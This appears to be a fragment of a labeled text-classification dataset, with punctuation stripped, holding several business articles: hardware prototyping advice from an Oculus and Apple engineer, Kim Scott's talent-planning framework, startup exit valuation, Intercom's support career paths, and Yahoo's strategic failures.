iteration cycles as possible   Kalinowski s recommended approach to prototyping  compared with most typical approaches  First  frontload  Pile on the effort and focus at the beginning of your journey   My former colleague Doug Field  who was a VP at Apple and now runs engineering at Tesla  had a very useful graph of how to think about design effort  Most people increase their effort and focus as the product develops and they find issues they need to fix or address  peaking at the moment right before you ship  Although this is sometimes unavoidable  this is not what you want to do  Making changes at the end of development is far more difficult  dangerous and costly than in the beginning   Kalinowski says   By the EVT  engineering validation test   your goal is to basically be done  Often it s very difficult to achieve this  but it s a good goal  If you have to fix major design issues after EVT  you ll have diminishing returns on your efforts  Ideally  the phases after EVT are a scaling operation in hardware or bug fixes in software  You won t have much ability to make big changes after this point without causing risk  Focus your effort towards the beginning  where you can squeeze in as many iterations and changes as possible  Go through crazy amounts of work right here  Put the best people on it  Do all of your grinding here    The more iterations  the better the product  The fewer iterations  the worse it ll be  It s that simple   Start with what s hardest  Take one thing at a time with your prototypes  and begin with the gnarliest challenge   Iterate on the most important  hardest thing first  This seems really simple  but people often don t actually do it  The best way to look at product development is to say   I want to dedicate the most time to the hardest thing and start to layer in the easier things as I go   It s usually easy to identify the hardest thing  What are you doing that nobody else has done before  This is the thing that you re not even sure you can do at all  That s where you want to focus your initial prototyping energy   Kalinowski   And momentum isn t an issue  If you take a typical engineer  show them a problem and say   I don t know if this is possible   they re usually all in  This principle serves to make sure you re frontloading the work by putting the hardest  most time consuming problem first   while also revving up your engineers by giving them a meaty problem to solve    Braid in other hard things as you progress   When you re prototyping  you don t need to do everything at once  You just need to prototype the hardest parts of the hardest things  The rest of it can be ugly and unuseful  Then as you iterate  draw in the next hardest thing and the next hardest thing  and integrate those aspects into your prototype   or put them in a separate prototype  then fork them together   Kalinowski says   Work forward from the hardest stuff in your prototyping  With Oculus Touch  the team started with a general shape  and once that was close  moved onto details around input  with the electrical innards and sensors split off into a separate set of prototypes  Once we got to far enough along with understanding space constraints  we braided the two prototypes together in our first integration build  proving that everything could fit    Make seriously ugly prototypes  No really  your early iterations should be hideous   You re focusing on the toughest engineering problems first  You don t need to worry about how it looks yet  But there s also a hidden benefit  When something is ugly  people don t fall in love with it  Especially with influential people inside a company  if you show them something that s physical and they see it  they will lock on it   Kalinowski says   This actually also happens a lot with price point  We have an inside joke at the company  because often  you put a very early estimate for product price on a slide and say   It could be this   Then for the next year  everyone s like   Oh  it s going to cost this   No  Don t give people anything to anchor to until you re absolutely ready for it  People do that and it s detrimental to the process  Add polish when you re selling something  A strategy for guarding a product s potential is to keep your prototypes and early ideas ugly longer    Let each team own their best case scenario  When developing Apple s cylindrical computer  the Mac Pro  Kalinowski had to juggle a multitude of factors   The industrial design team wanted the device to have a really small diameter  But that meant a small diameter on the heat sink   which was a problem  because we wanted as much heat transfer as we possibly could  When the heat sink was small  more air had to be pulled through to cool the central processing unit  CPU   making it louder  Yet still we needed the computer to be quiet   Kalinowski says   The way to solve this problem was to let each team completely own its best case scenario  There were separate teams inside Apple focused on optimizing for small diameter  focusing on keeping the noise down  worried about the heat transfer   we just let each one own that and drive as hard for their goal as they possibly could  For the thermal team  since this is a high performance machine  we needed the CPU performance as unlocked as possible  and so we let them fight for that  Then the audio team made sure the fan noise didn t cross a certain threshold  Let everyone work on the best possible outcome for the feature for which they re responsible  and you re likely to end up making the best product trade offs   and that means a better product    Smooth the negotiations while merging best case scenarios  Once each team has come up with their ideal solution  you ll have to start making tradeoffs   maybe the heat sink has to be tweaked in order to make the computer quieter  for example   I never go into a meeting where a major decision is going to be made without having pre baked the outcome  I first do a stakeholder analysis  go to each team  and get my proposal approved by everyone  What I learned at Apple is you really have to go around and explain what you think is right to each team  If you don t have  for example  buy in from across the product teams for a product decision  you really aren t going to get anything out of that meeting  Do a lot of the early upfront negotiation so that meetings are just about finalizing decisions and locking them in   Kalinowski says   You also have to understand technical tradeoffs  You can t just go in to an antenna team and say   We can t put antennas there  You have to put them here   and not understand if that s not going to work  Do a listening tour and learn from a technical perspective about product tradeoffs  Understand why a team wants something  Form relationships with experts in your team  listen to them  believe them  but also push on them all in different ways at the same time as you re trying to negotiate for that feature    Build ugly prototypes  It ll keep people from falling in love with ideas that aren t fully baked   The Three Bears of Prototyping  While you re executing the above approach  get familiar with three bears of the prototyping process  you can go for too long  not long enough   but also just right  Below  Kalinowski details the warning signs for the first two and illuminates when you re on the right track   Prototyping for too long  You can sense when you re on the wrong track when iterations start to yield tiny  incremental improvements and aren t converging towards your goal   If the results of your first  second  third and fourth tries at a problem land pretty close to each other  and you re still far from your goal  that means you ve made the wrong assumptions  You keep making changes but you can t get there  You ll no longer be closing on your goal in significant ways every time you iterate  At this point  you ve got it all wrong  Either change your goal or change your assumptions  Scrap the plan  Back up to the beginning and find a different way to solve that problem   Kalinowski says    Engineering teams will often iterate on one path forever and never hit their goal  It s hard to go backwards when you re in a product cycle and you want to ship  If you wait too long  that s the worst  It s so expensive that sometimes you can t even get back to the beginning   says Kalinowski  For the Mac Pro  we struggled to get the extrusion right  Two components  the heat sink and inner enclosure  were supposed to be made from one piece of aluminum  But it was too hard  We wound up cutting it into two pieces  even though the industrial design team really wanted it to be one  We went so far down the path trying to get it to be one piece  but in the end  it wasn t working  That s when Matt Casebolt made the call to stop  It s because he had that feeling  We weren t going to get there in time  We all wanted to make the industrial designers happy at Apple  but at a certain point  if you re not converging  you need to make the call  They made this call  It was the right one    How to tell if you re converging on the right solution in your prototyping process  Prototyping too short a time  Similarly  you can also sense when you haven t spent long enough iterating   Your engineers will be too worried  You ll ask them  What do you think  How s this going to work out   They ll say   I feel really uncomfortable  I don t know if this is going to work   Sometimes  they won t want to tell you  You have to really ask the right questions  like  What do you think we could be doing better   They ll get really uneasy  That s usually a big warning sign they feel you re moving too fast  Ask   What are you concerned about  What s concerning to you right now   The answer to that is gold  It s so valuable   Kalinowski says   Just because you re not hearing about it doesn t mean everything s okay  You can encourage people to tell you bad news by improving your response  If you get upset or dismiss them  they won t tell you anymore  Why would they  Even worse is to have an engineer express a concern directly and your response is   cool  thanks   If you don t do anything  they won t trust you  You have to be like   Oh  Shit  That s a problem  What do you think we should do   Tell them   Thank you so much  that s really helpful  Tell me more  I want to fix it   And be sure to actually do something about it  It often means connecting people or calling a meeting and making it known that you ll do everything you can to support your team in fixing the problem  Importantly  this goes double for your vendors    Prototyping just the right amount of time  Products are never perfect  but at some point you have to call it   There are always more iterations we can do and there is always something that engineers are worried about  because it s their job  Your engineers will never feel like the product s done  Usually team leaders are okay with shipping with a few minor issues  but engineers will struggle with it  My strategy is to say we ll get it right in the follow on product  Let the engineer know that you care  You want to get it right  But this product needs to go out   Kalinowski says   They ll still get to do all this cool engineering  They ll still get to solve this problem that they re unhappy about  Every engineer has that feeling of   Man  I wish I did this differently  This isn t quite where I want it to be   Great  Fix it  but you don t have to fix it right now in this product  You can fix it in the next product and the next product  and make sure that it s good forever forward  That helps a lot  Start a list of what you re not going to fix  That doesn t mean you ll never deal with it  Fix it next time  Worst case scenario  you can roll a fix after ramp  when you re building up a bunch of product right before the sales date  or iterate off build    If in each iteration you re making smaller and smaller improvements  that s a warning sign that you ve spent too much time on it   Getting to Blastoff  Under the  just right  scenario  you have to make a call to halt engineering at the right time  That time is most likely sooner rather than later   Ending your iterations close to the ship date is really dangerous because of all the interdependencies  Be ready to fight for not fixing problems unless they re non negotiables  For example  you can decide to change the material a few weeks before the ship date  Then you ll find out that the material change means the product is no longer waterfast  or it fails drop testing   Kalinowski says   You can screw up something else that you don t even know about  What I see a lot with immature companies is they try to make changes up until the very end and end up causing themselves more problems than they re solving  Those small changes could bork the whole thing    Iterate Your Way To Success  Start your prototyping process by pinpointing your North Star  Write down your must haves and don t ship until you ve achieved them  Determine your point on the speed caution slider  and optimize for the most iterations possible by starting with the hardest  thorniest problems  Frontload your work  Make ugly prototypes and fork in additional features in order of their difficulty to engineer  Watch out for the warning signs of prototyping too long   or prototyping not long enough  Determine your stopping point by evaluating the remaining flaws you still want to address  The later you wait to make changes  the more dangerous your decisions will be  Be willing to fight for not making fixes    Look on the desks of your engineers  Are they littered with ugly prototypes  If so  you re doing something right  Engineers often say they have it in their head how something is going to work  Ask for the parts  Ask to be shown  It often doesn t work like they think it s going to work  Push people to get to the prototyping faster  Then there s convergence  All of your prototypes should allow you to converge  folding in more and more iterations and versions  If they re not doing that  you might not be asking the right questions about your prototypes   Kalinowski says   Finally   and this is critical   prototyping is supposed to be really fun  If it s not fun  you re doing it wrong  If you re over constraining your engineers and they re not able to come up with really cool solutions  or they do and you squash them  that s bad  Free your engineers to come up with things   there should be an grand excess of cool ideas  After you ve popped the champagne to celebrate your successful ship  you can pick up the next great product from your cutting room floor    Photography by Christophe Wu 
3,business,Warning  This Is Not Your Grandfather s Talent PlanningGoogle  Apple  Dropbox  Twitter  If anyone has had a hand in helping build phenomenal teams at powerhouse companies in their prime  it s Kim Scott  At one point in her career  she admits she thought she was one of the best people in the world at creating amazing teams  That was  until an executive at Apple showed her how she d been systematically undervaluing some of the most important people on her teams throughout her career  Even worse  she d not been living in accordance with her own personal humanity   It was a big drink of water  even for someone who has become one of the greatest champions of radical candor  Scott  co founder of Candor  Inc   has built her career around creating bullshit free zones where people love their work and working together  She s seen it from every management vantage point  as a founder  Candor  Inc  and Juice Software   advisor  Dropbox  Twitter  Shyp  Qualtrics   instructor  Apple University  and operational leader  Google   So what did the Apple exec say   Inspired by her talk at First Round s CEO Summit  Scott shares her epiphany about management   and the mindset and framework it takes to really build a kick ass team  starting with deciphering the distinct attributes and incentives of high performers   How to Tell Your Stars Apart  There s a lot of jargon to describe superior performers on teams  10x engineer  sales wizard  growth ninja   Superstar  and  rock star  are also thrown about liberally  but Scott is on a mission to reclaim them  not as labels for people   but to understand what mode people are in at any given point in time   When I spoke with the Apple executive  she was trying to convey the difference between a person in superstar mode and one in rock star mode   terms which have been appropriated and have lost meaning  But when it comes to building teams  she felt it was really important to understand their distinct roles and needs    Here s what she meant   Superstar mode   the people on your team who are going to change everything  responsible for Schumpeterian change  a force   and source   of growth on a team   Rock star mode  the people on your team who don t want their boss  job  very talented at their role and will keep doing and digging into it for years if a boss doesn t screw it up  a force   and source   of excellence and stability on a team   The distinction between superstar mode and rock star mode hit a chord with Scott   When she told me this  I started to think about dozens of people who had worked for me  There was one guy in particular  Derrick  who was the first customer support hire at a startup I led years and years ago   says Scott   The customers loved Derrick   they just adored him  They d send him homemade donuts  Forget about NPS score  The real test of a great customer success person is  Do you get baked goods in the mail  This guy got baked goods galore    People in superstar mode want a world they can change  Those in rock star mode seek a world they can stabilize  You ll need both   As the company grew  Scott naturally presented Derrick with an opportunity for a leadership role   I asked him if he wanted to head up the support team  Derrick declined  He said to me   No  My real ambition is to be a Broadway actor  What I really want is to be able to leave work every day at 5pm so that I can get to these off Broadway productions that I do    says Scott   And here is where I made the mistake  I wrote Derrick off  Right at that moment  I totally wrote him off  I went out and I hired the person I thought I was supposed to hire  this super ambitious guy  who really didn t care at all about customer support  What he really wanted to do is be the CEO  But that s how you build a high performing team  right  You over hire    It wasn t long before Derrick came charging into my office   He launched into Ayn Rand and The Fountainhead  saying that you need your architects to change the world  but you also need people to turn the lights on  For that  you need great electricians  He went on to say that you don t want to hire a C  architect  you want to hire an A  electrician   says Scott   His analogy kind of made sense to me  but Derrick wasn t leading the team   the other guy I had hired was  so I let him do it his way  Soon  the inevitable happened  Derrick quit  the homemade donuts stopped coming  NPS dropped and revenue followed suit    By not recognizing the contribution that Derrick was making to the team  Scott wasn t building a high performing team   This instance made me realize that the way we tend to think about talent management gets it exactly wrong  Performance is a key factor   it s important to distinguish excellent performance from low performance  That s fine   says Scott   But often when we think about so called  talent planning    we use the word  potential    Potential  is exactly the wrong word    The problem with  potential  is that when you mark someone as low potential  you devalue your rock stars off the bat   Instead  use the word growth trajectory  There s nothing good or bad about a steep growth trajectory or a gradual growth trajectory  It just references different phases in our career   says Scott   When you look at your team this way  you identify five different modes that people can be in  They can be in superstar mode  They can be in rock star mode  Or on various paths to reaching or recessing from those modes    Scott has seen   and been a part of   some great teams  and they aren t all superstars and rock stars   If you look at this chart  the majority of people on your team  of course  will be doing good work  but not great work  noted by the yellow rectangle    says Scott   There are always going to be those puzzling people who ought to be doing great  but aren t  orange rectangle   Then of course there s the people who you ought to be firing  but you re not  red rectangle     Before you start to write your team into these buckets  let this one lesson sink in  don t use a permanent marker   I can t stress this enough for managers  There are no permanent markers  Don t write people s name in a box and leave them there   says Scott   Don t use this as a label for individuals  Use this to understand what a person wants at a moment in time  Remember  these are modes  not personality labels  Use this to understand what the dreams are of the people who work for you and to help them take a step in the direction of their dreams  not your dreams  Their ambitions  not your ambitions    This is not your grandfather s talent planning  It s simple and powerful  It should be done once a year   How To Use This Framework  Scott recommends that leaders work with their managers and teams to fill out this framework once a year   Take the time to help every single person on your team grow in the way that they want to grow  I don t know any leader who would disagree with that  but I know many who say they are too busy to take the time  So this is very fast   says Scott   Basically  all you need to do is create a shared document  get everybody who reports directly to you to put the names of their people in the box that best describes what mode they feel they re in  Then calibrate  Then make a short  bulleted list of what you re going to do for each person to help them grow appropriately    You ll have different definitions of excellent performance  where steep growth trajectory becomes gradual growth trajectory or how these definitions apply to your company   Use this opportunity to make sure you re all on the same page  Once everybody is calibrated  take a few minutes   and make sure everyone on your team does this   to write down some clear actions that you are going to do for each direct report  Do it for each of your direct reports  and see that they do it for each of their direct reports  And don t mix this exercise up with performance reviews if you do performance reviews    Kim Scott at First Round s CEO Summit in 2016  The specific actions managers take for people in each of these modes not only clears the way for distinct employees to thrive  but also leaves a significant imprint on the company culture  Here s how   Superstar mode  For the people who are in superstar mode   those who are going to drive growth on your team   what you want to offer them is new challenges  You want to keep them learning  The last thing you want to do is squash them    Shortly after I joined Google  Larry Page told me a story about a time when he had a summer job and his boss gave him a project that was supposed to take him the whole summer  Larry  of course  had an idea of how he could get it done in 12 hours or less   says Scott   His boss said   Oh no  no  no   He wanted to clip Larry s wings   We re going to do it the way we ve always done it  You have to spend the whole summer on it   It was a source of enormous frustration for Larry    When Page recounted this story to Scott  she could see how formative this moment was for him    Larry told me that he didn t want anybody at Google to have that experience ever  No clipping the wings of the superstars   and that s part of the reason why Google is such a great place to work I think   says Scott   They ve done a really good job making sure that they re helping people grow and define a path to promotion  They invest a lot in coaches  For smaller companies that maybe don t have Google sized budgets  it s still possible find people who can teach your superstars new things and who are a few years ahead of them  It s going to go a long way to help you retain them    Lastly  take note of the lifetime of superstars   Make sure you identify a successor because you often can t retain your superstars  They re going to leave you better than they found you  Make the most of them while you get them  but don t assume they are going to stick around forever because they often don t   says Scott   Whatever you do  don t confuse management and growth  Don t automatically manager track the people on a super steep growth trajectory  Often  especially for engineers  the last thing in the world they want to do is be a manager  but that doesn t mean that they are not on a super steep growth trajectory  Make sure you re giving the right kinds of challenges to the right people    Kim Scott  Rock star mode  People in rock star mode want a pasture  not a runway  You re not giving them a route to take off  but making space to settle into their work  What they need is freedom to do their superb work  not a path to promotion  which may distract them   Read The Peter Principle  a management book that reminds you of something that ought to be obvious but often isn t  don t promote someone into a job that they aren t good at   if they are great at doing something  don t promote them beyond their level of competence   says Scott   Also  there are times in life when people don t want a promotion   Don t promote people when they are in rock star mode  This advice often gets met with enormous resistance  I know it seems like a punch in the stomach or like I m telling you to punish your rock stars  I m not   says Scott   Take the case of T S  Elliot  Nobel Prize Winning poet  Before he could make his living as a poet  he was a clerk at Lloyd s of London  His boss famously said   I see no reason why  in time   in time  mind you   Elliot might not be an assistant branch manager  But you know what  T S  Elliot didn t give a shit about becoming assistant branch manager at Lloyd s of London  What he wanted   if his boss sought to retain him   was to get home an extra hour early so he had more time to write his poetry  The same was true with Derrick  He wanted his current job  not a  bigger  job    The choice of the manager here goes beyond just one rock star s role   Don t create an organization that is so obsessed by promotion and status that it feels humiliating for the rock stars to stick around   says Scott   Set them up as internal experts  Your rock stars love their craft and are great at it  They re better than anybody in the company and they can help bring the people in the middle along  They can help turn good performance into excellent performance from others  If they have an interest in teaching  by all means  let them teach    Finally  give them respect   Don t do to your rock stars what I did to Derrick  What I did to Derrick was not just bad for him  And not just bad for my team and the entire company   says Scott   But it was also bad for me  I wish I had known that earlier  because there came a time when I was the one on a more gradual growth trajectory  In 2008  I found myself in the following condition  short  old  and pregnant with twins  It was an extremely high risk pregnancy  Right at that moment in my career  one of the board members at Twitter visited and asked if I wanted to throw my hat in the ring to become the next CEO of Twitter    Now  a year before this offer  I probably would have cut off my left arm for that opportunity  but now I wasn t so sure I wanted it  I asked my doctor for advice  She said  Well  just ask yourself this question  what s more important  that job or the hearts and lungs of your children   Easy question to answer  right   says Scott   Before you attack my doctor as an anti feminist  let me just remind you  this was a high risk pregnancy  There are plenty of women who are pregnant with twins  who can charge ahead without missing a beat  But that wasn t my situation    Scott opted to stay at Google   I felt great about the decision that I d made  It was obviously right for my family and my life  but even then I was still sort of ambivalent about what that decision had done for my career  It wasn t until I learned about superstar mode and rock star mode that I understood that it had been good not only for me  but also for my team at Google  My team got better opportunities and our work did great things for Google   says Scott   Jumping ahead  it was also good for me  because it was while I was on bed rest when I realized how much more I cared about management than cost per click  Instead of becoming the CEO of Twitter  I coached the CEO of Twitter  It gave me time to write Radical Candor and eventually co found a startup  Candor  Inc    The bottom line is that it works out  but only if you respect your rock stars   and keenly balance your need for growth with stability on your team  Early stage and high growth startups will over index on superstars  but they ll need to add in rock stars as they grow  guaranteed   I ve seen the wheels come off the bus more than once when teams don t have enough rock stars  Balance growth and stability   Middle performance column  So what do you do for people who are just doing adequate work   I m going to assert that there s no such thing as a B player  Nobody s capable of doing just so so work  Everybody s capable of doing exceptional work   says Scott   Never write a human being off as mediocre  First you offer them radical candor or good feedback   both praise and criticism  Give your rock stars the opportunity to teach them how to do exceptional work  Challenge those doing satisfactory work with  stretch projects  that give them the chance to soar or fail  If they continue doing just adequate work  you re going to have some hard conversations about finding them another role where they can eventually excel    Low performance  steep trajectory mode  Those in the upper left quadrant are people who ought to be doing great but are failing for some reason   I call this the look yourself in the mirror quadrant  As a manager  this is when somebody else s poor performance may just be your fault  You may have them in the wrong role  That s the most common reason   says Scott   You may have given somebody too much too fast  Founders and CEOs often grow really fast in their careers and sometimes make the mistake of assuming that everybody else can do what they did  They may not be able to    In this scenario  ask yourself the following questions   Have you made expectations clear enough   Do you need to give these people clear feedback   Do they need a new manager   These questions should get to the heart of the issue   Sometimes people just don t get along with their boss  Are they having a personal problem that s temporary that you can just help them get through  Maybe it s just a bad fit   says Scott   Sometimes people just are not a good fit for a company    Low performance  gradual growth trajectory mode  There will be people who aren t doing well and aren t getting better   What about these people  It s not nice to these individuals to ignore their low performance   says Scott   They are capable of doing something great somewhere and it s profoundly unfair to them and also everyone else on your team who is doing great work if you don t move these people along  Just do it    The Best Type of Manager For High Performers  One of the biggest mistakes that managers make with the people who are doing the best on their team is just get out of their way   They know they ve hired talented people  and they don t want to micromanage them  So they just step aside so the high performers can do their thing   says Scott   That s like deciding that the best way to build a good marriage is to marry the right person and then avoid spending a single second with him  It would be like my calling my husband right now and saying   I m not coming home for dinner tonight or any other night for that matter  You re doing a great job raising those kids and I don t want to micromanage you   That s not going to go over very well with him   or our family    Don t do that to the people who work for you either  They want to work for you because they want to work with you   Keep your top performers top of mind  Literally  top of mind   as in  in your thoughts  What you want to be is a thought partner  This is not just a abstract title  like  thought leader   It means approaching their work with curiosity and with an aim to be equals in discussing it  They know when they need to know more  You are thoughtful  And you are a partner   says Scott   From a reporting point of view  you may still be their manager  but  for these high performers  you help manage their curiosity  not their work    If you re not a thought partner  you may easily fall into two other buckets when you manage high performers  the absentee manager or micro manager   You obviously don t want to be an absentee manager  but you also don t want to be a micro manager  Absentee managers lack curiosity  They really don t want to know and the micro manager  of course  pretends to know it all   says Scott   Reference this simple framework to make sure that you re landing in the right place as a manager for your top people   The Start of It All  Building a kickass team starts with something incredibly simple  not a big company process  but something you already know how to do  get to know people at a fundamental human level  This is one of the most important   and also the most enjoyable   parts of your job as a leader  Understanding what kind of growth trajectory each person on your team wants to be on and what motivates them at work is a concrete first step    All too often people undervalue taking time to understand what motivates their people and the importance of knowing their long term dreams  Instead of really understanding each person on their team  they have unsatisfying conversations about the next promotion So they fail to come up with career action plans that give context and meaning to their work   says Scott    Having three different career conversations   life story  dreams  and career action plan   is a much better course of action  It ll help you decode who s in superstar mode  rock star mode and   most critically   who is changing modes   says Scott   Taken together  these three conversations  with each person who reports directly to you  will help you balance growth and stability so your team can scale  It ll give meaning to your work  help build the best relationships of your career  and keep the baked goods from customers coming    Photography by Michael George 
4,business,When Should You Sell Your Startup When Should You Sell Your Startup   When should you sell your business  There is no universal to this answer because the question is multifaceted and unique to each company  But we can answer another related question  Given a declining growth rate  when is my company s value maximized   Startups strategic value lies within their ability to grow  The faster a company can grow  the more valuable it is  This relationship is remarkably linear   The chart above shows the public SaaS median EV TTM multiple  EV is enterprise value  or market cap minus cash  TTM is trailing twelve months revenue   the sum of the last twelve months of revenue   A business that grew 100  last year is worth 14 4x its trailing twelve months revenue  net of cash  And a company that grew 25  last year is worth 4 2x  The R 2 between revenue growth and multiple is 0 66  This means the growth rate explains 66  of the variance of the multiple  quite a strong relationship   Assume a startup generates  50M per year  Let s see how the value evolves in three different scenarios   Scenario  1  The company grows 100  in year 1 and 75  in year 2  Enterprise value increases from  736M to  1B   Scenario  2  The company grows a 75  in year 1 and 50  in year 2  EV rises from  582M to  642M   Scenario  3  The company grows 50  in year 1 and 25  in year two  EV declines from  428M to  342M  despite a revenue increase of  12 5M   This is the counterintuitive part  Just because the business grows doesn t means it increases its value  It has to grow at a certain rate to be worth more  In the last scenario  the company s EV falls by 20  despite a 25  revenue increase   I can poke many holes in this analysis  Mainly  I m valuing a business only by one metric  which doesn t reflect the reality   But the point still holds  Startups are valued for their growth  At some point  if the business can t grow fast enough  it s enterprise value will fall year over year  Selling a business before that occurs will maximize its value   Published 2017 03 23 in exits
5,business,How to keep and grow great customer support talentImagine a Customer Support team with high turnover and low tenure across the board   Your customers will only speak to people who haven t had time or mentorship to become experts  They ll receive continuous poor service  become frustrated and despite your great product  churn   Then consider employee morale in an environment void of solid team foundations or successful role models  Unhappy teammates are less productive and the circle of a poor customer experience continues  Why do many support teams fall victim to this cycle  They fail to provide a promising career path to those that join   Support at Intercom isn t a career stop gap  It can be a stepping stone to other departments roles  but we ve built a team where a long and successful career can be fostered within Support  Many teams provide limited progression  agent   supervisor   ceiling  and experience high turnover  which leads to poor support  Who wants to continuously lose their best people to other teams   Here s what we ve done at Intercom to ensure Support is a team where people can grow  develop and be really proud of their work   1  Create a plan for employee growth and development  During their first few months  we expect all Support teammates to become product experts and customer conversation ninjas  focusing on little else  Once a teammate is nailing the day job  we gradually involve them in other tasks  Some teammates are involved in both internal and external event management for Intercom  Others build internal tools for front line teams  They write blog posts  create educational content  and mentor and onboard other Intercomrades  This gives them a taste of people management  a voice in the direction of the team and helps them understand how and why we hire who we do   As small global team of five at the beginning of 2015  everyone did a bit of everything  But as we grew to 50 team members in 2016  across PST  GMT and APAC time zones  things became disorganized  There were too many cooks in the kitchen for some tasks  Others would stagnate with little to no attention  So we launched a project to define and assign Areas of Responsibility  AoR   which gives teammates autonomy  ownership and full control of their AoR   Frontline support isn t something to be escaped from  helping others solve hard problems is a valuable skill  and it s fun  Ultimately  we try to find the balance between helping teammates expand their skills while maintaining focus on our customers   2  Define Success and Progression Paths  Developing teammates  skill sets is all well and good  but you need to provide roles to put them to use  When our team was very small  it was made up of Support Representatives  Support Engineers and Support Leads  As we got bigger  and teammates became more tenured and skilled  we had to start defining career paths while allowing people to shape their own progression   Ensure people management is not the only progression path   We ve moved people to Lead positions  which is primarily people management and team leadership  But one of the most important things to consider when developing people is to ensure that people management is not the only progression path  So many support departments promote good reps and engineers to management as there s nowhere else to go  Having amazing CSAT doesn t mean you ll be a good people manager  Likewise  you may not be the most technical person but you could be a fantastic leader   We were careful not to create roles for the sake of holding on to teammates  but we also saw gaps in what we needed and filled new positions with the right people  Early on we experimented with a Senior Support Representative role  which was customer facing but heavy on process implementation  It simply pulled these folks in two very demanding directions  so instead we built a focused Operations team  We transitioned some team members there and reconsidered what a Senior Support Representative or Senior Support Engineer really should be 
6,business,The rise and fall  OK   mostly fall  of Yahoo   freeCodeCampThe rise and fall  OK   mostly fall  of Yahoo  Today Yahoo announced that it will sell its core assets to Verizon for a mere  4 8 billion  This is only slightly more than Verizon paid for AOL   another washed up dot com era company   last year   Yahoo s market capitalization reached  125 billion in 2000  Over the next 16 years  it steadily tumbled   mostly due to inaction and missed opportunities   You could fill an entire MBA course with case studies of all the strategic blunders Yahoo has made  I ll save you some student debt and give you the skinny right here  in just 5 minutes   Mistake  1  Yahoo confused being in the right place   at the right time   with being smart   If Yahoo had launched a year or two later  they probably would have been irrelevant  They rose to dominance in large part by benefitting from what Y Combinator cofounder Paul Graham   who worked there   called a  de facto ponzi scheme     Investors were excited about the Internet  One reason they were excited was Yahoo s revenue growth  So they invested in new Internet startups  The startups then used the money to buy ads on Yahoo to get traffic  Which caused yet more revenue growth for Yahoo  and further convinced investors the Internet was worth investing in    The growing revenues from this runaway feedback loop tricked Yahoo s management into thinking that they were smart  when really they were just lucky   As the dominant web portal  money came easy for Yahoo  They never bothered to build a strong engineering culture  like Facebook and Google did  After all  why should Yahoo invest in its underlying technology when they could just hire more sales people to sell banner ads   Yahoo s initial success gave them the hubris they needed to start acquiring other companies  thinking that they could run those companies better than the companies could run themselves   Here are some companies that Yahoo bought   Geocities   3 6 billion   Tumblr   1 1 billion   Mark Cuban s Broadcast com   5 7 billion   Radio  On  The internet  That s right   I m based off of Mark Cuban   Broadcast com and Tumblr are widely considered two of the worst acquisitions of all time  and were largely written off as losses  In less than 10 years  Geocities went from being the third most visited website on earth to being shut down everywhere but Japan   What remains of the  3 6 billion dollar Geocities acquisition   Mistake  2  Yahoo forgot what it was that got them there   Distracted by all the acquisitions  Yahoo s leadership forgot about its healthy core products  Here are a few multi billion dollar industries it ceded to new entrants   Yahoo Mail lost to GMail  Yahoo Answers lost to Quora  Flickr lost to Instagram  And most humiliating of all  Yahoo Search lost to Google Search   to such an extent that in 2009  Yahoo scrapped their 13 year old search engine in favor of licensing Bing Search  which Microsoft had just launched   These were all services where Yahoo had a multi year incumbent lead  with millions of active users  They had the funds  They had the traffic  They could have experimented and improved upon these services  But they failed to take the initiative  Instead  they got out designed and out engineered at every turn   Mistake  3  Yahoo slaughtered its golden goose while it was still producing eggs   In 2005  Yahoo cofounder Jerry Yang made one of the smartest investments in history   he purchased 40  of Chinese e commerce site Alibaba for  1 billion   Today Alibaba is worth more than  200 billion  and it s still growing  That means that Yahoo s stake in Alibaba must be worth  80 billion dollars   Alibaba founder and CEO Jack Ma  ready to correct me   Except  wait  In 2012  Yahoo decided to sell off significant portions of its Alibaba stock  They sold even more in 2014   Yahoo thought they were pretty clever at the time  because they profited a few billion dollars off of these sales   Today  Yahoo only owns 15  of Alibaba  but that asset alone is worth  30 billion   six times as much as all of Yahoo s core businesses   But  oh  that bittersweet  50 billion that they let get away   Mistake  4  Yahoo fell for CEOs who were professional professionals   You may think Marissa Mayer was a bad CEO  She did  after all  preside over Yahoo s disastrous Tumblr acquisition in 2013 and sale of Alibaba stock in 2014  And she did little to slow Yahoo s descent   But Mayer looks like a business genius when you compare her to the managers who preceded her   Instead of promoting executives from within  Yahoo chose to hire from the  professional CEO  circuit  And they did not choose wisely   Scott Thompson kicked off his tenure as CEO by laying off 2 000 people  Then he sold a ton of Yahoo s Alibaba stock  which  as we established  would have been worth tens of billions of dollars today    He was so worried about appearing qualified to run a tech company that he straight up lied about having a degree in computer science   At first  Yahoo s board doubted this accusation because it was coming from an activist shareholder   But then the university Thompson attended publicly confirmed that they didn t even have a computer science program back when he had attended   A public relations fiasco ensued  and Yahoo quickly fired Thompson  He had only worked there for 130 days  Despite all this  Yahoo ended up paying him  7 3 million for his time there   And then  there s Terry Semel  who is considered one of the worst CEOs of all time   Not the look you want to see on your CEO s face   Semel failed to acquire Google when Yahoo got its second opportunity to do so  Then he proceeded to do nothing to stop Google from devastating Yahoo s previous dominance of the search industry   Semel also botched acquisitions of both Facebook and DoubleClick  the technology that became the centerpiece of Google s advertising empire    And after all of these missteps  Semel blew his one shot at redemption  he turned down Microsoft s offer of  40 billion to buy Yahoo outright   The real kicker is that  over the 7 years that Semel drove the company into the ground  Yahoo compensated him with half a billion dollars   Mistake  5  Yahoo let their assumptions blind them to new opportunities   Larry Page and Sergey Brin tried to sell Google to Yahoo in 1998  They only wanted  1 million   Yahoo rejected them because they wanted their users to spend more time on Yahoo directories  where they would be exposed to banner ads  Better search   like the kind Google was offering   would quickly route users away from Yahoo   It didn t occur to Yahoo that doing what was best for users might ultimately be best for the company  Or that Google might use this technology to  you know  compete with Yahoo   Yahoo cofounder Jerry Yang once met with Google founders Sergey Brin and Larry Page  Yang s pose is   in retrospect   quite appropriate   Of course  we all know how this story ends   with Google being worth  500 billion  and Yahoo being carved up and sold to a utility company for one one hundredth of that   For those of you who are running a company or planning to start one  learn from Yahoo s mistakes  Take these lessons to heart   Don t confuse being in right place at the right time with being smart  Don t forget what it was that got you to where you are today  Don t slaughter your golden geese while they are still producing eggs  Don t fall for people who are professional professionals  And most of all  don t let your assumptions blind you to new opportunities   If you liked this  click the   below so other people will see this here on Medium 
